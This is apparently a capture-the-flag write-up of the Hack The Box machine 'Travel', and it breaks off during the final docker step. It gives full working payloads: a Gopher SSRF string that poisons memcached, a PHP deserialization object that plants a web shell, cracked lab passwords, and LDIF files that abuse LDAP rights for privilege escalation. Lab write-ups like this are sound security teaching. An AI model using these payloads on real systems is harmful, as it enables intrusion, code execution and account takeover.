# Starting the travel - Overview
[Travel](https://app.hackthebox.eu/machines/Travel) is an interesting box created by [jkr](https://app.hackthebox.eu/users/77141) and his team member [xct](https://app.hackthebox.eu/users/13569). It required some fuzzing and enumerating to get a foothold, exploiting memcached abusing a SSRF vulnerability and finally modifying users by taking advantage of our LDAP privileges.

## Recon
Since [the nmap scan](#Nmap scan) just shows ssh, http and https as open, we browse to 10.10.10.189 and the landing page not only gives away the domain name `travel.htb` but also mentions a blog site, so scanning for subdomains is the next logical step:
```bash
wfuzz -c --filter "l!=144" -z file,/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u "http://travel.htb" -H "Host: FUZZ.travel.htb"

000000032:   200        345 L    1408 W   24462 Ch    "blog"                         
000001035:   200        345 L    1408 W   24462 Ch    "Blog"                         
000001226:   200        51 L     126 W    1123 Ch     "ssl"                          
000004315:   200        51 L     126 W    1123 Ch     "SSL" 
```
Accessing the blog subdomain reveals a couple of things:
- user admin
- Wordpress login at http://blog.travel.htb/wp-login.php
- WP user registration not allowed

but unfortunately none of these infos will be of use.

Also, from reading the source code of the landing page we find another subdomain called `http://blog-dev.travel.htb/` which we get a 403 forbidden when browsing to. However we can scan this subdomain either with gobuster or nmap to find out that there's a git repository hidden:
{: .text-justify}
```bash
kali@kali:~/HTB/boxes/travel$ nmap -A -T 5 blog.travel.htb
80/tcp  open  http     nginx 1.17.6
| http-git:
|   10.10.10.189:80/.git/
|     Git repository found!
|     Repository description: Unnamed repository; edit this file 'description' to name the...
|_    Last commit message: moved to git

```
When fuzzing we need to use an appropriate wordlist such as the default Kali one `dirb/common.txt`.
Now we can use [git-dumper](https://github.com/arthaud/git-dumper) to dump the git repository which gives us the following files:
{: .text-justify}
```bash
kali@kali:~/HTB/boxes/travel/git/clone$ ls
README.md		# Mentions the setup of the site, the path `wp-content/themes/twentytwenty`
rss_template.php	# Reveals how the feed is working, mentions `debug.php`
template.php		# Contains class `TemplateHelper` and a helper function `safe` which checks an
			# URL for attempted LFI, command injection or SSRF
```
<br>
## Getting RCE 
The next steps all revolve around these three files so reading them thoroughly is definitely recommended.
If we look at `rss_template.php` more closely we see what the mitigations mentioned in the `safe` function of `template.php` are for:
{: .text-justify}
```php
# From rss_template.php
SERVER['QUERY_STRING'];
        if(strpos($url, "custom_feed_url") !== false){	# Searches the URL for the first occurence of `custom_feed_url`
                $tmp = (explode("=", $url));    # break URL into two parts
                $url = end($tmp);               # set $url to the string after the '='
        } else {				# if no custom feed was specified use the following one:
                $url = "http://www.travel.htb/newsfeed/customfeed.xml";
         }
         $feed = get_feed($url);                # call get_feed rss
```
So reading the code, we can apparently specify a custom feed url. To test this we set up a local http server and try to access it browsing to `http://blog.travel.htb/awesome-rss/?custom_feed_url=http://IP:8000/` and we record a GET request:
{: .text-justify}
```bash
kali@kali:~$ python -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
10.10.10.189 - - [01/AUG/2020 10:25:32] "GET / HTTP/1.1" 200 -
```
Therefore we have a server side request forgery (SSRF) vulnerability, lets see what we can request by looking at how the content is processed:
```php
function url_get_contents ($url) {
    $url = safe($url);
        $url = escapeshellarg($url);
        $pl = "curl ".$url;
        $output = shell_exec($pl);
    return $output;
}
# in short:
return shell_exec("curl ".escapeshellarg($url))
```
As this is a simple curl call and the input is sanitized via escapeshellarg, I was not able to use this to upload a shell. 
Looking further at the `safe` function from `temlpate.php` we see a comment `// this should be secure` hinting, that it's probably not secure. So where can we do something forbidden?
Playing around a little bit and searching the web [I found out](https://book.hacktricks.xyz/pentesting-web/ssrf-server-side-request-forgery) that we can circumvent the localhost restriction using the IP `0.0.0.0`. What do we want to access on localhost? Well, looking at `rss_template.php` again, we see that there is a connection established to a memcached service via 
{: .text-justify}
```php
$simplepie->set_cache_location('memcache://127.0.0.1:11211/?timeout=60&prefix=xct_');
```
Searching now for `memcached SSRF` I found the tool [Gopherus](https://github.com/tarunkant/Gopherus) which came in handy to create payloads. Following through the steps, choosing the default payload and changing the IP from `127.0.0.1` to `0.0.0.0` results in the following string, which we enter as the custom feed url:
{: .text-justify}
```bash
gopher://0.0.0.0:11211/_%0d%0aset%20SpyD3r%204%200%2016%0d%0aO:5:%22Hello%22:0:%7B%7D%0d%0a
```
To find out whether this worked or not, the `debug.php` mentioned in `rss_template.php` proofed to be useful. We find it browsing to `http://blog.travel.htb/wp-content/themes/twentytwenty/debug.php` - the path mentioned earlier in the README.md file - showing a table with truncated data after refreshing `http://blog.travel.htb/awesome-rss/`.
{: .text-justify}
```json
~~~~~~~~~~~~~~~~~~~~~ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
| xct_4e5612ba07(...) | a:4:{s:5:"child";a:1:{s:0:"";a:1:{(...) | 
~~~~~~~~~~~~~~~~~~~~~ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
```
If we use our custom feed url from above we get to see another entry:
```json
~~~~~~~~~~~~~~~~~~~~~ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ 
| SpyD3r | O:5:"Hello":0:{} | 
| xct_4e5612ba07(...) | a:4:{s:5:"child";a:1:{s:0:"";a:1:{(...) | 
~~~~~~~~~~~~~~~~~~~~~ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
```
So the the awesome-rss blog page is cached in the second row. Once it's in there it will revert to this entry when refreshing the awesome-rss blog page - but if we can write our payload in there in the meantime it will execute that instead. For this we need the key which is unfortunately truncated. This can be achieved either by reading the simplepie source code (turns out the key is generated by `xct_ + md5(md5(feed_url) + ":spc")`) or by deploying things locally. I went for the latter and after some tweaking I retrieved the key from memcached:
{: .text-justify}
```bash
telnet 127.0.0.1 11211
Trying 127.0.0.1...
Connected to 127.0.0.1.
Escape character is '^]'.
stats items
STAT items:16:number 1
[snip]
stats cachedump 16 100
ITEM xct_4e5612ba079c530a6b1f148c0b352241 [2737 b; 1595004892 s]
END
```
Now that we got the key we can verify that we are now able to overwrite an existing cache entry. By changing `SpyD3r` to `xct_4e5612ba079c530a6b1f148c0b352241`. 
Now, to get RCE, the class `TemplateHelper` from the `template.php` file might come in handy because of the `file_put_contents` function. By following this [post](https://medium.com/swlh/exploiting-php-deserialization-56d71f03282a) on how to exploit php deserialization and using [this tool](https://www.unserialize.com/) I came up with the following payload:
```json
# Basically, the latter 'O' means object, 's' string, and the digit following 
# tells how many characters the object/string consists of
O:14:"TemplateHelper":2:{s:4:"file";s:8:"this.php";s:4:"data";s:31:"<?php system($_GET['this']); ?>";}
```
This payload creates a file called `this.php` in the `logs` folder containing `<?php system($_GET['this']); ?>`. This way we can get a reverse shell in three steps, after URL encoding:
{: .text-justify}
```bash
# Overwriting the cache
http://blog.travel.htb/awesome-rss/?debug&custom_feed_url=gopher://0.0.0.0:11211/_%0d%0aset%20xct_4e5612ba079c530a6b1f148c0b352241%204%200%20102%0d%0aO:14:%22TemplateHelper%22:2:%7Bs:4:%22file%22%3Bs:8:%22this.php%22%3Bs:4:%22data%22%3Bs:31:%22%3C%3Fphp%20system%28%24_GET%5B%27this%27%5D%29%3B%20%3F%3E%22%3B%7D%0d%0a

```
```bash

## On the box
This was hard work but the steps to user are walked fast: A bit of enumeration shows an unusual SQL dump in /opt:
```bash
INSERT INTO `wp_users` VALUES (1,'admin','$P$BIRXVj/ZG0YRiBH8gnRy0chBx67WuK/','admin','admin@travel.htb','http://localhost','2020-04-13 13:19:01','',0,'admin'),(2,'lynik-admin','$P$B/wzJzd3pj/n7oTe2GGpi5HcIl4ppc.','lynik-admin','lynik@travel.htb','','2020-04-13 13:36:18','',0,'Lynik Schmidt');
```
Cracking the PW of lynik-admin with john and the usual `rockyou.txt` results in `1stepcloser` which made me smirk. This is his ssh password and we obtain the user flag, now smiling.
{: .text-justify}
```bash
lynik-admin@travel:~$ ls
user.txt
```
<br>
# Root part.
It's a good habit to start looking where you land and here, it paid big time: 
```bash
lynik-admin@travel:~$ ls -a
.  ..  .bash_history  .bash_logout  .bashrc  .cache  .ldaprc  .profile  user.txt  .viminfo
lynik-admin@travel:~$ cat .ldaprc 
HOST ldap.travel.htb
BASE dc=travel,dc=htb
BINDDN cn=lynik-admin,dc=travel,dc=htb
```
To verify we are on the right track we look at `/etc/hosts` to see if/how the domain is resolved:
```bash
lynik-admin@travel:~$ cat /etc/hosts
127.0.0.1 localhost
127.0.1.1 travel
172.20.0.10 ldap.travel.htb
```
## Connecting the dots
We start out by trying to query the ldap service right away and are greeted by `Invalid credentials` using several passwords we found along the way:
```bash
lynik-admin@travel:~$ ldapsearch ldap.travel.htb -D "cn=lynik-admin,dc=travel,dc=htb" "uid=lynik-admin" -x -w 1stepcloser
ldap_bind: Invalid credentials (49)
```
Thus we investigate our home directory even more and find the LDAP password inside `.viminfo`:
```bash
lynik-admin@travel:~$ cat .viminfo 
[snip]
# Registers:
""1     LINE    0
        BINDPW Theroadlesstraveled
|3,1,1,1,1,0,1587670528,"BINDPW Theroadlesstraveled"
```
Now, the above `ldapsearch` command works using `Theroadlesstraveled` as password. We notice a bunch of users and that lynik-admin is a LDAP admin:
```bash
ldapsearch -x -H ldap://ldap.travel.htb -D "cn=lynik-admin,dc=travel,dc=htb" -w Theroadlesstraveled
# lynik-admin, travel.htb
dn: cn=lynik-admin,dc=travel,dc=htb

[snip]

```
Also `getent passwd` shows the users from `ldapsearch` and `getent group` lists them in the group `domainusers`:
```bash

gloria:*:5010:5000:Gloria Wood:/home@TRAVEL/gloria:/bin/bash

domainusers:*:5000:frank,brian,christopher,johnny,jerry,louise,eugene,edward,gloria,lynik,julia
```
So after reading up a bit, to see what we can do with our privileges, the following seems most promising:
- modifying their UID and GID -> even if we can't become root directly we might be able to exploit docker/lxd
- adding SSH public keys -> to log in

These two options will indeed elevate us to root. In order to modify the attributes of users using the `ldapmodify` command we need to create so called `.ldif` files:
```bash
ldapmodify -x -H ldap://ldap.travel.htb -D "cn=lynik-admin,dc=travel,dc=htb" -w Theroadlesstraveled -f file.ldif -c
```
```bash
# SSH.ldif
# adding SSH key
dn: uid=frank,ou=users,ou=linux,ou=servers,dc=travel,dc=htb
changeType: modify
add: objectClass
objectClass: ldapPublicKey
-
add: sshPublicKey
sshPublicKey: your-public-key
```
I tried a couple of GIDs (0, lxd..) first but docker was the one that opened the path to root for me.
```bash
# Group.ldif
# replacing GID by 117 (docker)
dn: uid=frank,ou=users,ou=linux,ou=servers,dc=travel,dc=htb
changeType: modify
replace: gidNumber
gidNumber: 117
```
And we can now log into the box as frank and take a look at the available docker images. Mounting the appropriate one gets the job done:
```bash
frank@travel:~$ docker images
